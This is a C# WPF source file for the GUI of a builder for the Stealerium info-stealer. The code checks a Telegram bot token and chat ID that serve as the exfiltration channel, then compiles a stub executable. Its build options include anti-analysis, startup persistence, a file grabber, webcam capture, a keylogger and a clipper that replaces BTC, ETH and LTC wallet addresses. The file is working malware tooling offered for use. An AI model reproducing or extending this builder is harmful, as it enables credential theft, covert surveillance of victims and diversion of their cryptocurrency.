using System.IO;
using System.Net.Http;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;

namespace BuilderGUI
{
    public partial class MainWindow
    {
        private string stubPath;
        private bool isStubDetected = false;
        private bool isApiTokenValid = false;
        private bool isChatIdValid = false;

        public MainWindow()
        {
            InitializeComponent();
            CheckStubFile();
        }

        private void CheckStubFile()
        {
            // Assume stub.exe is in the "Stub" folder relative to the application's directory
            stubPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub", "stub.exe");

            if (File.Exists(stubPath))
            {
                StubStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
                StubStatusLabel.Title = "Stub Detected";
                StubStatusLabel.Message = $"Stub detected at: {stubPath}";
                StubStatusLabel.IsOpen = true;
                StubStatusLabel.IsClosable = false;
                isStubDetected = true;
            }
            else
            {
                StubStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
                StubStatusLabel.Title = "Stub Not Found";
                StubStatusLabel.Message = "stub.exe not found! Please place it in the 'Stub' folder.";
                StubStatusLabel.IsOpen = true;
                StubStatusLabel.IsClosable = false;
                isStubDetected = false;
            }

            UpdateBuildButtonState();
        }

        private void UpdateBuildButtonState()
        {
            // Enable BuildButton only if both the stub is detected and both API token and chat ID are valid
            BuildButton.IsEnabled = isStubDetected && isApiTokenValid && isChatIdValid;
        }

        private async void ApiTokenTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();

            // Show the LoadingOverlay while validating
            LoadingOverlay.Visibility = Visibility.Visible;

            if (!string.IsNullOrEmpty(token))
            {
                isApiTokenValid = await Telegram.TokenIsValidAsync(token);  // Asynchronously validate the token
                WebhookStatusLabel.Message = isApiTokenValid ? "Telegram API token is valid." : "Invalid Telegram API token!";
                WebhookStatusLabel.Severity = isApiTokenValid ? Wpf.Ui.Controls.InfoBarSeverity.Success : Wpf.Ui.Controls.InfoBarSeverity.Error;
            }
            else
            {
                isApiTokenValid = false;
                WebhookStatusLabel.Message = "Telegram API token cannot be empty.";
                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
            }

            // Hide the LoadingOverlay after validation
            LoadingOverlay.Visibility = Visibility.Collapsed;

            UpdateBuildButtonState();
        }

        private async void ChatIdTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();
            var chatId = ChatIdTextBox.Text.Trim();

            // Show the LoadingOverlay while validating
            LoadingOverlay.Visibility = Visibility.Visible;

            if (!string.IsNullOrEmpty(chatId) && !string.IsNullOrEmpty(token))
            {
                // Attempt to send a test message with the provided Chat ID to validate
                isChatIdValid = await ValidateChatIdAsync(token, chatId);

                if (isChatIdValid)
                {
                    WebhookStatusLabel.Message = "Telegram Chat ID is valid.";
                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
                }
                else
                {
                    WebhookStatusLabel.Message = "Invalid Telegram Chat ID.";
                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
                }
            }
            else
            {
                isChatIdValid = false;
                WebhookStatusLabel.Message = "Telegram Chat ID cannot be empty.";
                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
            }

            // Hide the LoadingOverlay after validation
            LoadingOverlay.Visibility = Visibility.Collapsed;

            UpdateBuildButtonState();
        }


        // Helper method to validate Chat ID by sending a test message
        private async Task<bool> ValidateChatIdAsync(string token, string chatId)
        {
            try
            {
                string testMessage = "Validating chat ID";
                string telegramApiUrl = $"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(testMessage)}";

                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage response = await client.GetAsync(telegramApiUrl);

                    // If the response status code is 200, the Chat ID is valid
                    return response.IsSuccessStatusCode;
                }
            }
            catch (Exception ex)
            {
                // Log any exceptions, if needed
                Console.WriteLine("Validation failed: " + ex.Message);
                return false;
            }
        }

        private async void TestTelegramButton_Click(object sender, RoutedEventArgs e)
        {
            var token = ApiTokenTextBox.Text.Trim();  // Get the Telegram bot token from the text box
            var chatId = ChatIdTextBox.Text.Trim();   // Get the Telegram chat ID from the text box

            if (string.IsNullOrEmpty(token))
            {
                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
                {
                    Title = "Error",
                    Content = "Telegram bot API token cannot be empty.",
                };
                _ = await uiMessageBox.ShowDialogAsync();
                return;
            }

            if (string.IsNullOrEmpty(chatId))
            {
                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
                {
                    Title = "Error",
                    Content = "Telegram chat ID cannot be empty.",
                };
                _ = await uiMessageBox.ShowDialogAsync();
                return;
            }

            TestTelegramButton.IsEnabled = false;
            WebhookStatusLabel.Message = "Testing Telegram connection...";
            WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Informational;
            WebhookStatusLabel.IsOpen = true;

            // Check if the Telegram API token is valid
            bool isTokenValid = await Telegram.TokenIsValidAsync(token);

            if (!isTokenValid)
            {
                WebhookStatusLabel.Message = "Invalid Telegram bot API token!";
                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
            }
            else
            {
                // Send a test message to the chat
                int messageId = await Telegram.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token, chatId);
                bool messageSent = messageId > 0;

                if (messageSent)
                {
                    WebhookStatusLabel.Message = "Connected successfully!";
                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
                }
                else
                {
                    WebhookStatusLabel.Message = "Failed to send test message.";
                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
                    isTokenValid = false; // Consider the token invalid if the message fails
                }
            }

            UpdateBuildButtonState();
            TestTelegramButton.IsEnabled = true;
        }

        private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            StartupOptionsPanel.Visibility = Visibility.Visible;
        }

        private void StartupCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            StartupOptionsPanel.Visibility = Visibility.Collapsed;
        }

        private void ClipperCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Visible;
        }

        private void ClipperCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Collapsed;
        }

        private void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            BuildStub();
        }

        private void BuildStub()
        {
            // Collect and validate inputs
            var token = ApiTokenTextBox.Text.Trim();
            var chatId = ChatIdTextBox.Text.Trim();

            if (string.IsNullOrEmpty(token))
            {
                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
                {
                    Title = "Error",
                    Content = "Telegram bot API token cannot be empty.",
                };
                _ = uiMessageBox.ShowDialogAsync();
                return;
            }

            if (string.IsNullOrEmpty(chatId))
            {
                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
                {
                    Title = "Error",
                    Content = "Telegram chat ID cannot be empty.",
                };
                _ = uiMessageBox.ShowDialogAsync();
                return;
            }

            // Set configuration values for build
            Build.ConfigValues["TelegramAPI"] = Crypt.EncryptConfig(token);
            Build.ConfigValues["TelegramID"] = Crypt.EncryptConfig(chatId);
            Build.ConfigValues["Debug"] = DebugCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["AntiAnalysis"] = AntiAnalysisCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["Startup"] = StartupCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["StartDelay"] = StartDelayCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["Grabber"] = GrabberCheckBox.IsChecked == true ? "1" : "0";

            if (Build.ConfigValues["Startup"] == "1")
            {
                Build.ConfigValues["WebcamScreenshot"] = WebcamScreenshotCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Keylogger"] = KeyloggerCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Clipper"] = ClipperCheckBox.IsChecked == true ? "1" : "0";
            }
            else
            {
                Build.ConfigValues["WebcamScreenshot"] = "0";
                Build.ConfigValues["Keylogger"] = "0";
                Build.ConfigValues["Clipper"] = "0";
            }

            if (Build.ConfigValues["Clipper"] == "1")
            {
                Build.ConfigValues["ClipperBTC"] = Crypt.EncryptConfig(ClipperBTCTextBox.Text.Trim());
                Build.ConfigValues["ClipperETH"] = Crypt.EncryptConfig(ClipperETHTextBox.Text.Trim());
                Build.ConfigValues["ClipperLTC"] = Crypt.EncryptConfig(ClipperLTCTextBox.Text.Trim());
            }
            else
            {
                Build.ConfigValues["ClipperBTC"] = "";
                Build.ConfigValues["ClipperETH"] = "";
                Build.ConfigValues["ClipperLTC"] = "";
            }

            // Prompt the user to select the output file location
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Title = "Save Built Stub",
                Filter = "Executable Files (*.exe)|*.exe",
                FileName = "build.exe"
            };

            if (saveFileDialog.ShowDialog() == true)
            {
                try
                {
                    var buildPath = Build.BuildStub(saveFileDialog.FileName, stubPath);
                    BuildStatusLabel.Text = $"Stub built successfully: {buildPath}";
                    BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
                }
                catch (Exception ex)
                {
                    BuildStatusLabel.Text = $"Build failed: {ex.Message}";
                    BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
                }
            }
            else
            {
                BuildStatusLabel.Text = "Build cancelled by user.";
                BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Gray;
            }
        }
    }
}
